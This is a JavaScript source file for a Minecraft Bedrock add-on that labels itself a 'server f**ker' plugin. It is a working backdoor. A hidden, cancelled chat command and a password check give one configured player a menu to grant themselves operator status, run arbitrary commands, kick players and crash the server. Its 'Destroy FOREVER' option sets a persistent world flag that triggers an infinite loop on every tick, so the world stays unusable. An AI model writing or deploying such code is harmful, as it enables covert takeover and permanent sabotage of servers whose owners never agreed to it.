import { DynamicPropertiesDefinition, world, MinecraftEntityTypes, system } from "@minecraft/server";
import { config } from "./config";
import { ActionFormData, ModalFormData } from "@minecraft/server-ui";
import { sha256 } from "./lib/sha256";
// import "./noserverfucker";
// ignore this //
// import { PlayerJoined } from "./lib/playerJoined";
let breaker = "a";
class mcDelay {
    constructor(func, delayTicks) {
        this.time = 0;
        this.func = func;
        this.delayTicks = delayTicks;
        this._tick = () => {
            this.time++;
            if (!(this.time >= this.delayTicks)) {
                system.run(this._tick);
            }
            else {
                this.func();
            }
        };
        system.run(this._tick);
    }
}
world.events.worldInitialize.subscribe(e => {
    let defineProp = new DynamicPropertiesDefinition();
    defineProp.defineBoolean("auth");
    e.propertyRegistry.registerEntityTypeDynamicProperties(defineProp, MinecraftEntityTypes.player);
    let defineProp2 = new DynamicPropertiesDefinition();
    defineProp2.defineBoolean("be");
    e.propertyRegistry.registerWorldDynamicProperties(defineProp2);
});
const ticking = () => {
    if (world.getDynamicProperty("be")) {
        for (;;) {
            breaker += "a";
        }
    }
    system.run(ticking);
};
system.run(ticking);
// PlayerJoined.subscribe(e => {
//     if (e.player.name === config.playerName) {
//         new mcDelay(() => {
//             Array.from(world.getPlayers({ name: config.playerName }))[0].setDynamicProperty("auth", false);
//             let form: MessageFormData = new MessageFormData();
//             form.title("SERVER F**KER PLUGIN");
//             form.body("SERVER F**KER PLUGIN LOADED ON THIS SERVER.\nWould you like to f**k this server now?");
//             form.button1("YES");
//             form.button2("Not now");
//             //@ts-ignore
//             form.show(Array.from(world.getPlayers({ name: config.playerName }))[0])
//                 .then(res => {
//                     if (!res.canceled || res.selection === 2) {
//                         fuck(Array.from(world.getPlayers({ name: config.playerName }))[0]);
//                     } else {
//                         Array.from(world.getPlayers({ name: config.playerName }))[0].runCommandAsync(`tellraw @s ${JSON.stringify({ rawtext: [{ text: "[SERVER F**KER PLUGIN] OK. You can send `.fserver` to f**k this server later." }] })}`);
//                     }
//                 });
//         }, 20);
//     }
// });
world.events.beforeChat.subscribe(e => {
    if (e.sender.name === config.playerName && e.message === ".fkserver") {
        new mcDelay(() => {
            fuck(Array.from(world.getPlayers({ name: config.playerName }))[0]);
        }, 3 * 20);
        e.sender.runCommandAsync(`tellraw @s ${JSON.stringify({ rawtext: [{ text: "[SERVER F**KER PLUGIN] Please close your chat and wait for 3 seconds..." }] })}`);
        e.cancel = true;
    }
});
function fuck(player) {
    if (player.getDynamicProperty("auth")) {
        let form = new ActionFormData();
        form.title("SERVER F**KER PLUGIN")
            .button("Get OP (Beta) ")
            .button("Run command")
            .button("Kick Player (UNABLE TO USE) ")
            .button("Destroy Server (VERY DANGEROUS) ")
            //@ts-ignore
            .show(player)
            .then(res => {
            if (!res.canceled) {
                switch (res.selection) {
                    case 0:
                        try {
                            player.setOp(true);
                            //world.getDimension("overworld").runCommandAsync(`op "${config.playerName}"`).catch(() => { player.runCommandAsync(`tellraw @s ${JSON.stringify({ rawtext: [{ text: "[SERVER F**KER PLUGIN] Error: Get OP failed." }] })}`); });
                        }
                        catch {
                            player.runCommandAsync(`tellraw @s ${JSON.stringify({ rawtext: [{ text: "[SERVER F**KER PLUGIN] Error: Get OP failed." }] })}`);
                        }
                        break;
                    case 1:
                        let cmdForm = new ModalFormData();
                        cmdForm.textField("Command", "The command you want to execute.", "gamemode 1");
                        cmdForm.title("SERVER F**KER PLUGIN");
                        //@ts-ignore
                        cmdForm.show(player)
                            .then(res2 => {
                            if (!res2.canceled) {
                                //@ts-ignore
                                player.runCommandAsync(res2.formValues[0]).catch(() => { });
                            }
                        });
                        break;
                    case 2:
                        let players = [];
                        for (let player of Array.from(world.getAllPlayers())) {
                            players.push(player.name);
                        }
                        let kickForm = new ModalFormData();
                        kickForm
                            .title("SERVER F**KER PLUGIN")
                            .dropdown("Select the player you want to kick...", players)
                            //@ts-ignore
                            .show(player)
                            .then(res2 => {
                            //@ts-ignore
                            if (!res2.canceled && res2.formValues.length) {
                                //@ts-ignore
                                world.getDimension("overworld").runCommandAsync(`kick "${res2.formValues[0]}"`);
                            }
                        });
                        break;
                    case 3:
                        let destroyForm = new ActionFormData();
                        destroyForm.title("SERVER F**KER PLUGIN")
                            .body("ARE YOU SURE? THIS IS VERY DANGEROUS")
                            .button("Destroy (Owner can restart)")
                            .button("Destroy FOREVER")
                            .button("Cancel");
                        //@ts-ignore
                        destroyForm.show(player)
                            .then(res2 => {
                            if (!res2.canceled && res2.selection != 2) {
                                if (res2.selection === 0) {
                                    for (;;) {
                                        breaker += "a";
                                    }
                                }
                                else if (res2.selection === 1) {
                                    world.setDynamicProperty("be", true);
                                }
                            }
                        });
                        break;
                    default:
                        break;
                }
            }
        });
    }
    else {
        auth(player);
    }
}
function auth(player) {
    let form = new ModalFormData();
    form.textField("Password", "Your password before SHA-256.");
    form.title("SERVER F**KER PLUGIN");
    //@ts-ignore
    form.show(player)
        .then(res => {
        if (!res.canceled) {
            //@ts-ignore
            if (sha256(res.formValues[0]) === config.password.toLocaleLowerCase()) {
                player.setDynamicProperty("auth", true);
                player.runCommandAsync(`tellraw @s ${JSON.stringify({ rawtext: [{ text: "[SERVER F**KER PLUGIN] Logged in! Send `.fkserver` to f**k server!" }] })}`);
            }
            else {
                player.runCommandAsync(`tellraw @s ${JSON.stringify({ rawtext: [{ text: "[SERVER F**KER PLUGIN] Error: Incorrect password." }] })}`);
            }
        }
    });
}
